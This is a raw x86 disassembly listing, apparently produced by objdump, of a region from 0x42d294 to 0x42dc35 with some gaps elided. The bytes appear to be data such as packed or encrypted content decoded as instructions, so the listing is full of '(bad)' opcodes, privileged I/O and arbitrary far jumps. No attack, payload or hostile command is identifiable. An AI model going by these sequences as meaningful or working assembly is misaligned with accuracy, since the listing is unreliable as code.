  42d294:	add    BYTE PTR [eax],0x47
  42d297:	jmp    0x96de:0x95785717
  42d29e:	pop    eax
  42d29f:	retf   
  42d2a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d2a2:	sub    al,0x3d
  42d2a4:	dec    ebx
  42d2a5:	fidiv  DWORD PTR [ecx+0xd]
  42d2a8:	push   es
  42d2a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2aa:	sbb    ch,BYTE PTR [edi+ebx*2]
  42d2ad:	xor    eax,0xbc2dcda3
  42d2b2:	(bad)  
  42d2b3:	das    
  42d2b4:	test   BYTE PTR ds:0xd55fe9e9,0x1d
  42d2bb:	pop    esp
  42d2bc:	sbb    DWORD PTR [edi],edi
  42d2be:	sti    
  42d2bf:	rcr    bl,1
  42d2c1:	or     DWORD PTR [esi+0x74f7419c],edx
  42d2c7:	(bad)  
  42d2c8:	fnstsw WORD PTR [edi]
  42d2ca:	jne    0x42d28a
  42d2cc:	(bad)
  42d2d0:	in     al,0xbe
  42d2d2:	stos   DWORD PTR es:[edi],eax
  42d2d3:	clc    
  42d2d4:	mov    dl,0x5b
  42d2d6:	fsub   DWORD PTR [edi]
  42d2d8:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d2da:	jns    0x42d275
  42d2dc:	scas   eax,DWORD PTR es:[edi]
  42d2dd:	xchg   DWORD PTR [esi],edi
  42d2df:	jb     0x42d328
  42d2e1:	shl    dh,cl
  42d2e3:	sbb    ebx,ecx
  42d2e5:	dec    eax
  42d2e6:	sub    DWORD PTR [ecx],0x19
  42d2e9:	inc    ebx
  42d2ea:	ror    BYTE PTR [eax],0xe9
  42d2ed:	mov    esp,0x6eb7aea5
  42d2f2:	add    DWORD PTR [edx+0x47],ecx
  42d2f5:	and    al,0x93
  42d2f7:	lahf   
  42d2f8:	jg     0x2fae622d
  42d2fe:	dec    esi
  42d2ff:	ror    DWORD PTR [ecx-0x48],0x34
  42d303:	mov    edi,0xb5d5e210
  42d308:	cmp    eax,0xa7a3db19
  42d30d:	xchg   esp,eax
  42d30e:	mov    edx,0x8d23020e
  42d313:	jle    0x42d2c3
  42d315:	inc    edx
  42d316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d317:	jae    0x42d364
  42d319:	sbb    al,0x75
  42d31b:	or     ebp,DWORD PTR [esi+eiz*2-0x13f741b7]
  42d322:	push   cs
  42d323:	daa    
  42d324:	xchg   esi,eax
  42d325:	sbb    BYTE PTR [esp+ecx*8+0x4b],dh
  42d329:	cdq    
  42d32a:	sbb    DWORD PTR [ecx],esi
  42d32c:	ror    ebp,1
  42d32e:	fwait
  42d32f:	sub    dl,BYTE PTR [eax+ebx*1+0xacfeae6]
  42d336:	push   eax
  42d337:	adc    esi,DWORD PTR [esi+0x44]
  42d33a:	mov    ch,0xdd
  42d33c:	icebp  
  42d33d:	je     0x42d36c
  42d33f:	cmp    BYTE PTR [edx+ecx*2-0x24db14c9],dh
  42d346:	jle    0x42d345
  42d348:	in     eax,0x4f
  42d34a:	outs   dx,DWORD PTR ds:[esi]
  42d34b:	js     0x42d36c
  42d34d:	lea    esp,[edx]
  42d34f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d350:	out    0x25,al
  42d352:	lds    esp,FWORD PTR [esi+ecx*2]
  42d355:	adc    DWORD PTR [ecx+eiz*2+0x1b],ebx
  42d359:	push   ds
  42d35a:	scas   al,BYTE PTR es:[edi]
  42d35b:	arpl   dx,si
  42d35d:	fidiv  DWORD PTR [ebx-0x13]
  42d360:	xor    esi,DWORD PTR [esi]
  42d362:	lods   eax,DWORD PTR ds:[esi]
  42d363:	sbb    al,0x52
  42d365:	out    dx,al
  42d366:	rcr    BYTE PTR [ebx],1
  42d368:	xchg   esi,eax
  42d369:	push   edx
  42d36a:	aad    0x7b
  42d36c:	cmp    eax,0x6097620b
  42d371:	add    BYTE PTR [edi-0x6ce22a63],0x29
  42d378:	clc    
  42d379:	enter  0x57d4,0x27
  42d37d:	sbb    ch,BYTE PTR [edi]
  42d37f:	jmp    0xb67301de
  42d384:	xor    eax,0x213eb458
  42d389:	or     eax,0x8fb8d106
  42d38e:	mov    edx,0x26
	...
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	mov    edi,0x1446779b
  42d405:	in     al,0x1
  42d407:	add    BYTE PTR [ecx+eax*1],al
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	fiadd  DWORD PTR [ecx-0x6541dfa9]
  42d412:	sbb    esp,DWORD PTR [ecx-0x77dc1a4e]
  42d418:	pop    ds
  42d419:	fisttp QWORD PTR [esi]
  42d41b:	cmp    BYTE PTR [ecx-0x698fd10d],ah
  42d421:	xor    BYTE PTR [ecx],0xec
  42d424:	add    BYTE PTR [edi+ebp*4-0x1a],0x2b
  42d429:	mov    ch,0x1c
  42d42b:	jo     0x42d3b8
  42d42d:	add    ebp,DWORD PTR [edi]
  42d42f:	mov    cl,0xfa
  42d431:	lods   eax,DWORD PTR ds:[esi]
  42d432:	repnz repnz inc esp
  42d435:	ret    
  42d436:	cmp    DWORD PTR cs:[edi+0x533e2f3a],0xffffffb1
  42d43e:	arpl   di,cx
  42d440:	das    
  42d441:	clc    
  42d442:	jg     0x42d4c3
  42d444:	fxch   st(7)
  42d446:	icebp  
  42d447:	sahf   
  42d448:	mov    al,0xca
  42d44a:	sahf   
  42d44b:	dec    esi
  42d44c:	sub    al,al
  42d44e:	jp     0x42d473
  42d450:	test   BYTE PTR ds:0xd5bc064f,al
  42d456:	je     0x42d46c
  42d458:	jns    0x42d4d8
  42d45a:	cs leave 
  42d45c:	ins    BYTE PTR es:[edi],dx
  42d45d:	add    al,0xd1
  42d45f:	pop    ebx
  42d460:	fadd   QWORD PTR [ebp-0x4c2218c4]
  42d466:	and    bh,BYTE PTR [ebx]
  42d468:	out    0x1f,al
  42d46a:	mov    esp,0x2a01f31a
  42d46f:	mov    ch,0xe8
  42d471:	pop    ecx
  42d472:	dec    eax
  42d473:	push   ss
  42d474:	and    BYTE PTR [ebx+0x60],ch
  42d477:	pop    ecx
  42d478:	aas    
  42d479:	adc    ecx,DWORD PTR [ecx-0x3f04e5c4]
  42d47f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d480:	ins    BYTE PTR es:[edi],dx
  42d481:	xlat   BYTE PTR ds:[ebx]
  42d482:	dec    ebx
  42d483:	mov    eax,0xecacb596
  42d488:	js     0x42d4b1
  42d48a:	xchg   edi,eax
  42d48b:	add    al,ch
  42d48d:	test   DWORD PTR [ebx+0x298c5f4a],ebx
  42d493:	dec    esp
  42d495:	or     esi,edi
  42d497:	mov    DWORD PTR [eax-0x48],ebx
  42d49a:	pop    es
  42d49b:	ror    cl,0x95
  42d49e:	pop    ebp
  42d49f:	iret   
  42d4a0:	sbb    DWORD PTR [edi-0xddef15c],edx
  42d4a6:	lock aam 0x9f
  42d4a9:	aaa    
  42d4aa:	jns    0x42d4fe
  42d4ac:	jns    0x42d493
  42d4ae:	outs   dx,BYTE PTR ds:[esi]
  42d4af:	call   0xf4bf89cb
  42d4b4:	je     0x42d4cd
  42d4b6:	mov    gs,WORD PTR [eax+0x204378ad]
  42d4bc:	pop    ebp
  42d4bd:	pop    edx
  42d4be:	add    ecx,edx
  42d4c0:	push   es
  42d4c1:	sbb    al,0x91
  42d4c3:	mov    ah,0x32
  42d4c5:	add    al,0x1c
  42d4c7:	(bad)  
  42d4c8:	enter  0x16b9,0x88
  42d4cc:	(bad)  
  42d4cf:	out    dx,al
  42d4d0:	mov    ecx,0xc4f2f24a
  42d4d5:	into   
  42d4d6:	daa    
  42d4d7:	fsubr  QWORD PTR [esi]
  42d4d9:	dec    esp
  42d4da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4db:	jo     0x42d4a8
  42d4dd:	sub    WORD PTR [edx+0x3],sp
  42d4e1:	jge    0x42d51c
  42d4e3:	fdiv   st(4),st
  42d4e5:	scas   al,BYTE PTR es:[edi]
  42d4e6:	outs   dx,DWORD PTR ds:[esi]
  42d4e7:	test   al,0x91
  42d4e9:	mov    ch,BYTE PTR [ecx+0x74]
  42d4ec:	inc    ecx
  42d4ed:	xchg   ah,bl
  42d4ef:	mov    ecx,0xee3e74c
  42d4f4:	loopne 0x42d4df
  42d4f6:	(bad)  
  42d4f7:	jp     0x42d493
  42d4f9:	add    al,0x12
  42d4fb:	and    esp,edx
  42d4fd:	jmp    0x42d53f
  42d4ff:	cmp    DWORD PTR [ebp+ebp*2+0x6d],edx
  42d503:	ret    0xb0b0
  42d506:	mov    eax,DWORD PTR [esi]
  42d508:	sub    DWORD PTR [ebx+0x77],0xb156ab5
  42d50f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0xcc5e58d5,eax
  42d583:	das    
  42d584:	sbb    ch,ah
  42d586:	add    DWORD PTR [eax],eax
  42d588:	add    al,0x1
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	leave  
  42d58d:	push   ds
  42d58e:	fstp   QWORD PTR ds:0xae47d692
  42d594:	pop    edx
  42d595:	(bad)  
  42d596:	adc    ecx,DWORD PTR [ebx+0x56]
  42d599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d59a:	bound  eax,QWORD PTR [ebx]
  42d59c:	mov    eax,0x8b387431
  42d5a1:	pop    es
  42d5a2:	add    al,0xdc
  42d5a4:	lds    eax,FWORD PTR ds:0x165a755f
  42d5aa:	test   eax,0x3aebc81b
  42d5af:	sahf   
  42d5b0:	or     eax,0x86a5da69
  42d5b5:	int3   
  42d5b6:	lods   eax,DWORD PTR ds:[esi]
  42d5b7:	ret    
  42d5b8:	shl    ebp,cl
  42d5ba:	lods   al,BYTE PTR ds:[esi]
  42d5bb:	mov    edx,ds
  42d5bd:	outs   dx,DWORD PTR ds:[esi]
  42d5be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d5bf:	stos   DWORD PTR es:[edi],eax
  42d5c0:	inc    ebp
  42d5c1:	outs   dx,DWORD PTR ds:[esi]
  42d5c2:	mov    ch,0x4a
  42d5c4:	ds rcr ebx,cl
  42d5c7:	icebp  
  42d5c8:	pop    ss
  42d5c9:	inc    esp
  42d5ca:	popf   
  42d5cb:	mov    BYTE PTR [ecx+eiz*2],bl
  42d5ce:	add    eax,0xccf19578
  42d5d3:	adc    bh,dh
  42d5d5:	cli    
  42d5d6:	pusha  
  42d5d7:	aas    
  42d5d8:	mov    WORD PTR [ecx-0x58],gs
  42d5db:	sub    BYTE PTR ds:0x5e2b2f94,dl
  42d5e1:	fwait
  42d5e2:	pop    ebp
  42d5e3:	fcmovu st,st(6)
  42d5e5:	add    ecx,DWORD PTR gs:[ecx-0x34954738]
  42d5ec:	aad    0x94
  42d5ee:	mov    ah,0x9
  42d5f0:	(bad)  
  42d5f1:	and    eax,0x73a24099
  42d5f6:	rcl    eax,0xfa
  42d5f9:	test   al,0x4
  42d5fb:	hlt    
  42d5fc:	lahf   
  42d5fd:	mov    DWORD PTR [edi-0xc],eax
  42d600:	ins    DWORD PTR es:[edi],dx
  42d601:	sahf   
  42d602:	mov    eax,ds:0xe79de4fa
  42d607:	jge    0x42d5a2
  42d609:	adc    eax,0xfb675a42
  42d60e:	test   ebx,edx
  42d610:	adc    ebp,0x4c952a11
  42d616:	sbb    DWORD PTR [eax],edi
  42d618:	ficomp WORD PTR [edx-0x1a1b8eef]
  42d61e:	loopne 0x42d619
  42d620:	cmp    al,0x9
  42d622:	sub    BYTE PTR [eax+ebx*2-0x34],al
  42d626:	mov    ecx,0xb2500a3
  42d62b:	or     dh,BYTE PTR [edi+0x5ef2a07]
  42d631:	and    eax,0xf82ffad1
  42d636:	stc    
  42d637:	jmp    0x42d5fe
  42d639:	fisttp WORD PTR [esi+0x24]
  42d63c:	jmp    0x4865:0x9598b0da
  42d643:	lahf   
  42d644:	stos   BYTE PTR es:[edi],al
  42d645:	inc    edi
  42d646:	scas   al,BYTE PTR es:[edi]
  42d647:	mov    al,0x5f
  42d649:	mov    ch,0x7e
  42d64b:	inc    edi
  42d64c:	shl    bh,cl
  42d64e:	loope  0x42d648
  42d650:	dec    ebp
  42d651:	imul   ecx,DWORD PTR [edi],0x48
  42d654:	retf   
  42d655:	loop   0x42d6d4
  42d657:	int    0x5b
  42d659:	push   es
  42d65a:	leave  
  42d65b:	das    
  42d65c:	inc    eax
  42d65d:	sbb    ecx,edi
  42d65f:	push   edx
  42d660:	dec    esp
  42d661:	add    DWORD PTR [esi-0x4d],edi
  42d664:	inc    esp
  42d665:	es mov ebx,0x737eeeed
  42d66b:	rcl    DWORD PTR [esi],0xc9
  42d66e:	jmp    0xd3c0:0xfbeb864
  42d675:	call   0x1991ca95
  42d67a:	xor    BYTE PTR [ebx],bl
  42d67c:	pushf  
  42d67d:	cmp    eax,DWORD PTR [edx]
  42d67f:	sbb    ebx,DWORD PTR [edx-0x7dbb938e]
  42d685:	adc    ch,ch
  42d687:	jle    0x42d60c
  42d689:	mov    ebx,ebx
  42d68b:	add    BYTE PTR [esi+0xe94456],dh
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x25
  42d701:	test   al,0x65
  42d703:	adc    al,0x1c
  42d705:	out    0x1,al
  42d707:	add    BYTE PTR [ecx+eax*1],al
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	mov    gs,WORD PTR [ebx]
  42d70e:	push   ds
  42d70f:	dec    edx
  42d710:	scas   al,BYTE PTR es:[edi]
  42d711:	mov    dh,0x37
  42d713:	xchg   ebp,eax
  42d714:	mov    eax,ds:0x415c45ce
  42d719:	in     eax,dx
  42d71a:	mov    esi,0x48da1dd9
  42d71f:	cmp    ebp,ecx
  42d721:	rol    esi,1
  42d723:	and    esp,edx
  42d725:	aas    
  42d726:	cmp    eax,0x9127b8e0
  42d72b:	fbstp  TBYTE PTR [edx]
  42d72d:	mov    ds:0xe20cff6,al
  42d732:	push   ds
  42d733:	dec    edi
  42d734:	test   eax,0xf2cabdf2
  42d739:	add    al,0xd8
  42d73b:	std    
  42d73c:	sbb    bl,BYTE PTR [esi-0x4f14c298]
  42d742:	ret    
  42d743:	cs add eax,0xfa6499cb
  42d749:	dec    esp
  42d74a:	dec    ebp
  42d74b:	or     eax,0xf3bd386e
  42d750:	(bad)  
  42d752:	dec    edi
  42d753:	mov    edx,cs
  42d755:	mov    bh,0x2b
  42d757:	out    0x9f,eax
  42d759:	xchg   DWORD PTR [ecx-0xc],esp
  42d75c:	daa    
  42d75d:	xor    DWORD PTR [edi-0x48],edi
  42d760:	mov    edi,0x511d9373
  42d765:	loop   0x42d6ff
  42d767:	mov    esp,0x3f036b7c
  42d76c:	retf   0x5a9f
  42d76f:	popa   
  42d770:	or     cl,BYTE PTR [edx+0x45c5075e]
  42d776:	add    al,0xb
  42d778:	jge    0x42d7c0
  42d77a:	add    bh,BYTE PTR [ebp+0x26e4e1cd]
  42d780:	push   ecx
  42d781:	inc    esi
  42d782:	pushf  
  42d783:	or     ebx,ecx
  42d785:	ror    DWORD PTR [eax+0xe],0x66
  42d789:	aad    0xb5
  42d78b:	push   ebx
  42d78d:	xor    eax,0xb7bc5925
  42d792:	dec    edx
  42d793:	popa   
  42d794:	out    dx,eax
  42d795:	mov    edi,DWORD PTR [edi+ecx*2-0x52]
  42d799:	adc    eax,0xcff15f3b
  42d79e:	cwde   
  42d79f:	gs dec esp
  42d7a1:	mov    ds:0xc1450a6,al
  42d7a6:	enter  0x79e0,0xa3
  42d7aa:	add    DWORD PTR [ebx],edi
  42d7ac:	and    eax,0x9616fcc2
  42d7b1:	add    eax,0xda26f3f
  42d7b6:	fs mov esi,0xae4f0a2a
  42d7bc:	ret    0x5e74
  42d7bf:	push   edi
  42d7c0:	sub    ch,dl
  42d7c2:	mov    bh,0xe9
  42d7c4:	out    0x7b,eax
  42d7c6:	aam    0xf
  42d7c8:	mov    al,0xf2
  42d7ca:	dec    eax
  42d7cb:	pop    es
  42d7cc:	push   eax
  42d7cd:	xlat   BYTE PTR ds:[ebx]
  42d7ce:	stc    
  42d7cf:	cmp    cl,BYTE PTR [ebx]
  42d7d1:	mov    al,0xae
  42d7d3:	in     eax,0x4c
  42d7d5:	jle    0x42d83a
  42d7d7:	or     dh,dl
  42d7d9:	mov    es,WORD PTR [ebx-0x26]
  42d7dc:	sahf   
  42d7dd:	push   ebx
  42d7de:	pop    edx
  42d7df:	add    ch,BYTE PTR [edi]
  42d7e1:	jmp    0xc126:0xb5518775
  42d7e8:	imul   ebp,DWORD PTR [ebx],0x27
  42d7eb:	aaa    
  42d7ec:	sbb    dh,BYTE PTR [ebp+0x1c]
  42d7ef:	imul   esi,DWORD PTR [edx+esi*8],0x2a
  42d7f3:	out    0x46,eax
  42d7f5:	aad    0x16
  42d7f7:	std    
  42d7f8:	pushf  
  42d7f9:	jl     0x42d7f5
  42d7fb:	mov    esp,0xb9e3d22f
  42d800:	sbb    BYTE PTR [eax-0x57],ah
  42d803:	mov    edx,0xfe518847
  42d808:	clc    
  42d809:	das    
  42d80a:	lds    esi,FWORD PTR [edx]
  42d80c:	and    BYTE PTR [ebp+0x42],bl
  42d80f:	call   0x42d814
	...
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xfec6961a
  42d881:	xor    ebx,ecx
  42d883:	inc    ecx
  42d884:	and    bh,ah
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    al,0x1
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	shl    bl,1
  42d88e:	popa   
  42d88f:	xchg   ah,ah
  42d891:	lea    edx,[ecx-0x37b06cb]
  42d897:	mov    al,0xbb
  42d899:	popa   
  42d89a:	(bad)  
  42d89c:	push   ebx
  42d89d:	pushf  
  42d89e:	lahf   
  42d89f:	mov    BYTE PTR [ebx-0x75c0a915],bl
  42d8a5:	imul   edi,ecx,0xffffffa5
  42d8a8:	test   edx,eax
  42d8aa:	inc    ecx
  42d8ab:	mov    esp,0xdfbdff03
  42d8b0:	aam    0x6a
  42d8b2:	mov    BYTE PTR [eax+0x63],al
  42d8b5:	out    0x7,al
  42d8b7:	jns    0x42d912
  42d8b9:	sub    BYTE PTR [edx-0x12],ch
  42d8bc:	mov    ds:0xd3b206fc,al
  42d8c1:	xor    DWORD PTR [edi+0x2cc10daf],ebp
  42d8c7:	and    ah,bl
  42d8c9:	stos   BYTE PTR es:[edi],al
  42d8ca:	add    ebx,ebp
  42d8cc:	call   0x2a3e:0xaa23dc71
  42d8d3:	mov    esp,0xcf49fb28
  42d8d8:	inc    edx
  42d8d9:	jns    0x42d880
  42d8db:	fisttp QWORD PTR [ebx]
  42d8dd:	mov    ebp,0x49cd99d2
  42d8e2:	mov    ebp,0x5b4183ca
  42d8e7:	int3   
  42d8e8:	call   0x3ecc:0x91d41f21
  42d8ef:	pop    ecx
  42d8f0:	push   0xa60b17c9
  42d8f5:	xchg   esp,eax
  42d8f6:	push   ss
  42d8f7:	(bad)  
  42d8f8:	and    al,0x94
  42d8fa:	jnp    0x42d886
  42d8fc:	push   esp
  42d8fd:	jbe    0x42d8cf
  42d8ff:	outs   dx,BYTE PTR ds:[esi]
  42d900:	out    dx,eax
  42d901:	mov    ah,0x83
  42d903:	add    bl,ah
  42d905:	(bad)  
  42d906:	push   cs
  42d907:	outs   dx,DWORD PTR ds:[esi]
  42d908:	pop    esi
  42d909:	aam    0x11
  42d90b:	sahf   
  42d90c:	jl     0x42d8d7
  42d90e:	xor    DWORD PTR [ecx-0x16],ebp
  42d911:	jl     0x42d8b1
  42d913:	dec    edi
  42d914:	push   es
  42d915:	or     BYTE PTR ds:0xd40390d9,ah
  42d91b:	ret    
  42d91c:	sub    DWORD PTR [ecx+ecx*1],0x3089bd3e
  42d923:	dec    ecx
  42d924:	pop    eax
  42d925:	mov    ecx,0x71f37655
  42d92a:	sbb    BYTE PTR [edx+0x1baaba05],dh
  42d930:	cmp    cl,cl
  42d932:	jmp    0x5a96a5fa
  42d937:	cli    
  42d938:	loope  0x42d929
  42d93a:	add    ah,bh
  42d93c:	pusha  
  42d93d:	mov    ds:0x91dad6a3,al
  42d942:	ret    0x3f5f
  42d945:	out    0xd,al
  42d947:	sbb    DWORD PTR [ecx],0x34e5d83d
  42d94d:	xor    BYTE PTR [edi+0x6a995a33],al
  42d953:	push   es
  42d954:	inc    eax
  42d955:	pop    ebx
  42d956:	dec    eax
  42d957:	mov    esi,0xca203c9c
  42d95c:	dec    esp
  42d95d:	sbb    edx,DWORD PTR [edx]
  42d95f:	jge    0x42d9c5
  42d961:	sub    dh,BYTE PTR [esp+ebx*2]
  42d964:	pop    esi
  42d965:	xlat   BYTE PTR ds:[ebx]
  42d966:	adc    bx,WORD PTR [ebp+0x604f7568]
  42d96d:	mov    ds:0x94631246,eax
  42d972:	in     al,0xb8
  42d974:	ds stc 
  42d976:	ja     0x42d98c
  42d978:	mul    BYTE PTR [ecx]
  42d97a:	jnp    0x42d98f
  42d97c:	ret    
  42d97d:	mov    cl,BYTE PTR [eax-0x27]
  42d980:	in     eax,0xf4
  42d982:	sahf   
  42d983:	jge    0x42d993
  42d985:	inc    ebp
  42d986:	add    al,0x25
  42d988:	shr    BYTE PTR [esi],0xfc
  42d98b:	inc    edi
  42d98c:	outs   dx,DWORD PTR ds:[esi]
  42d98d:	dec    ebp
  42d98e:	xor    al,0xc6
	...
  42d9f4:	stc    
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	scas   eax,DWORD PTR es:[edi]
  42da01:	call   0x1:0xe8244fae
  42da08:	add    al,0x1
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	push   edi
  42da0d:	(bad)  
  42da0e:	imul   edx,DWORD PTR [edi+0x6a],0xc6496a55
  42da15:	cli    
  42da16:	pop    ebp
  42da17:	loopne 0x42da88
  42da19:	and    DWORD PTR [esi+0x31],ebp
  42da1c:	adc    al,0x14
  42da1e:	mov    dh,0xae
  42da20:	or     DWORD PTR [edx+esi*4],0x6bbba3e0
  42da27:	jmp    0x42da47
  42da29:	xor    cl,BYTE PTR [edi-0x41]
  42da2c:	icebp  
  42da2d:	cs ins DWORD PTR es:[edi],dx
  42da2f:	cmp    al,0xa6
  42da31:	pop    esp
  42da32:	dec    ebp
  42da33:	mov    bh,0xcd
  42da35:	rol    edx,1
  42da37:	or     eax,0xa9943e53
  42da3c:	inc    edx
  42da3d:	gs jmp 0xea46:0xdc91a5f8
  42da45:	jmp    0x75f333de
  42da4a:	xchg   esi,eax
  42da4b:	mov    esp,0x1f2b1f5d
  42da50:	in     eax,dx
  42da51:	or     ebx,DWORD PTR [edx]
  42da53:	jmp    0xfbb6:0x480b19d
  42da5a:	into   
  42da5b:	aaa    
  42da5c:	xor    dh,ch
  42da5e:	cmc    
  42da5f:	or     eax,0xfb46a0e5
  42da64:	sub    DWORD PTR [esi-0x140a3381],esp
  42da6a:	and    ch,BYTE PTR [edi+0x31]
  42da6d:	mov    edx,0x85612f4b
  42da72:	in     al,0x9a
  42da74:	cdq    
  42da75:	inc    DWORD PTR [edi+eax*8]
  42da78:	xchg   ebx,eax
  42da79:	int    0x88
  42da7b:	jecxz  0x42da13
  42da7d:	data16 xlat BYTE PTR ds:[ebx]
  42da7f:	sub    ch,cl
  42da81:	loop   0x42da6a
  42da83:	xor    edx,DWORD PTR ds:0x52ba1eb7
  42da89:	lods   eax,DWORD PTR ds:[esi]
  42da8a:	pusha  
  42da8b:	ja     0x42da52
  42da8d:	adc    ch,cl
  42da8f:	outs   dx,BYTE PTR ds:[esi]
  42da90:	push   edx
  42da91:	jnp    0x42dabf
  42da93:	add    ecx,DWORD PTR [esi-0x27]
  42da96:	enter  0x5c35,0xef
  42da9a:	mov    ds:0x6c93afc7,al
  42da9f:	lds    ecx,FWORD PTR [edx+0x2fe4bbde]
  42daa5:	pop    edx
  42daa6:	sub    DWORD PTR [ebx+0x56e8c2f3],esi
  42daac:	mov    dl,0x40
  42daae:	and    bl,BYTE PTR [edx]
  42dab0:	jmp    0xc6c9fb6e
  42dab5:	pushf  
  42dab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dab7:	shl    BYTE PTR [ebx],cl
  42dab9:	setne  BYTE PTR [edx+0x6]
  42dabd:	out    0xa7,eax
  42dabf:	aam    0x1c
  42dac1:	std    
  42dac2:	add    eax,0x6e7c998b
  42dac7:	popf   
  42dac8:	pop    ebx
  42dac9:	mov    ebp,0x7197edb9
  42dace:	cmp    al,0x48
  42dad0:	stos   DWORD PTR es:[edi],eax
  42dad1:	sub    ch,BYTE PTR [esi-0x57963dd9]
  42dad7:	xchg   edx,eax
  42dad8:	inc    ebx
  42dad9:	cmp    eax,0x4ccf667f
  42dade:	push   ebx
  42dadf:	ja     0x42db56
  42dae1:	(bad)  [edx]
  42dae3:	xlat   BYTE PTR ds:[ebx]
  42dae4:	dec    edx
  42dae5:	pop    ebp
  42dae6:	mov    cs,WORD PTR [eax]
  42dae8:	and    al,0x0
  42daea:	js     0x42db19
  42daec:	rcl    esi,cl
  42daee:	data16 jle 0x42db3b
  42daf1:	rcl    BYTE PTR cs:[ecx],cl
  42daf4:	pop    ecx
  42daf5:	ret    0x41c7
  42daf8:	push   ebp
  42daf9:	cmp    BYTE PTR [eax+0x1881929b],ch
  42daff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db00:	sbb    ebp,edx
  42db02:	sbb    eax,0x7e38e1cc
  42db07:	pop    eax
  42db08:	lock arpl WORD PTR [edi+0x4228029d],si
  42db0f:	jne    0x42db11
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db58
  42db81:	mov    DWORD PTR [ebp+0x7f],esp
  42db84:	sub    cl,ch
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    al,0x1
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	mov    dh,0x34
  42db8e:	adc    DWORD PTR [eax+0x5b92b922],edi
  42db94:	popf   
  42db95:	out    0xf,al
  42db97:	mov    ch,0x3c
  42db99:	stc    
  42db9a:	sub    DWORD PTR [edx-0x13],edi
  42db9d:	mov    esi,0x8dbab9b0
  42dba2:	push   ebx
  42dba3:	cwde   
  42dba4:	inc    ebx
  42dba5:	sub    eax,0xb51406e5
  42dbaa:	push   es
  42dbab:	push   es
  42dbac:	es icebp 
  42dbae:	xchg   esp,eax
  42dbaf:	jle    0x42dba8
  42dbb1:	leave  
  42dbb2:	aaa    
  42dbb3:	pop    edi
  42dbb4:	lahf   
  42dbb5:	cmp    DWORD PTR [eax],esp
  42dbb7:	adc    DWORD PTR [esi-0x29],ebx
  42dbba:	dec    ecx
  42dbbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dbbc:	push   DWORD PTR [ebp+edx*2+0x62f643d4]
  42dbc3:	idiv   BYTE PTR [eax]
  42dbc5:	mov    ebp,0x4a9b1c6e
  42dbca:	aaa    
  42dbcb:	repz out 0x3,al
  42dbce:	xchg   DWORD PTR ds:0x9b23dd3f,esi
  42dbd4:	mov    bh,0x86
  42dbd6:	inc    esi
  42dbd7:	stc    
  42dbd8:	cmp    eax,0x7293dc09
  42dbdd:	sbb    cl,BYTE PTR [edi+0x5f]
  42dbe0:	inc    edx
  42dbe1:	xor    edx,DWORD PTR [edx+eiz*8+0x50222ecd]
  42dbe8:	dec    esp
  42dbe9:	mov    bh,0xd4
  42dbeb:	in     eax,0x1b
  42dbed:	data16 clc 
  42dbef:	pop    edx
  42dbf0:	or     al,0x66
  42dbf2:	neg    DWORD PTR [ebp-0x42]
  42dbf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbf6:	jbe    0x42dc60
  42dbf8:	lock xchg ecx,eax
  42dbfa:	and    eax,0x9871592a
  42dbff:	fisub  WORD PTR [ebp-0x1b]
  42dc02:	mov    ebp,0x941dbddc
  42dc07:	(bad)  
  42dc08:	aad    0xc2
  42dc0a:	lods   eax,DWORD PTR ds:[esi]
  42dc0b:	xchg   DWORD PTR [esi+0x3b953c45],eax
  42dc11:	xchg   edi,eax
  42dc12:	fimul  DWORD PTR [edi]
  42dc14:	into   
  42dc15:	dec    edx
  42dc16:	xchg   BYTE PTR [edx],bl
  42dc18:	sbb    DWORD PTR [ecx-0x773291bf],0x9b142c28
  42dc22:	xor    eax,0xf417265b
  42dc27:	mov    ecx,DWORD PTR [eax-0x4d61ed05]
  42dc2d:	cld    
  42dc2e:	popf   
  42dc2f:	fnsave [ebx-0x3e7abe2]
  42dc35:	fwait
